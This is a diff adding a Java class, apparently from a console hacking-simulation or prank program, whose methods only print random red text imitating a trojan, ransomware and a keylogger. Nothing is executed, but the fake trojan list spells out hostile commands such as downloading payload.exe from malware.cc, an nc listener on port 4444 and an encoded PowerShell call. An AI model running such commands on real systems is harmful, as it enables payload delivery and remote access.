@@ -1,0 +1,47 @@
+package utils;
+
+import gui.MenuConsola;
+
+public class GestorPayloads {
+	public static void ejecutarPayloadTroyano() {
+		String[] logs = {
+				"whoami", "netstat -an", "ipconfig", "tasklist",
+				"dir C:\\Usuarios", "powershell -enc ZXhwbG9pdA==",
+				"ssh root@185.22.11.4", "curl http://malware.cc/payload.exe",
+				"nmap -sV 192.168.1.0/24", "nc -lvnp 4444", "attrib +h payload.exe"
+		};
+
+		while (true) {
+			int random = (int) (Math.random() * logs.length);
+			System.out.println(MenuConsola.ROJO + logs[random]);
+			Utils.esperar(250);
+		}
+	}
+
+	public static void ejecutarPayloadRansomware() {
+		String simbolos = "@#$%&01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+
+		while (true) {
+			for (int i = 0; i < 30; i++) {
+				int random = (int) (Math.random() * simbolos.length());
+				System.out.print(MenuConsola.ROJO + simbolos.charAt(random));
+			}
+			Utils.esperar(10);
+		}
+	}
+
+	public static void ejecutarPayloadKeylogger() {
+		String[] datos = {
+				"a", "s", "d", "f", "gmail.com", "123456",
+				"paypal_login", "discord_token", "admin",
+				"qwerty", "mastercard", "usuario: steve",
+				"usuario: alfredo", "password: ********"
+		};
+
+		while (true) {
+			int random = (int) (Math.random() * datos.length);
+			System.out.println(MenuConsola.ROJO + "[ KEYLOGGER ] Capturado: " + datos[random]);
+			Utils.esperar(150);
+		}
+	}
+}
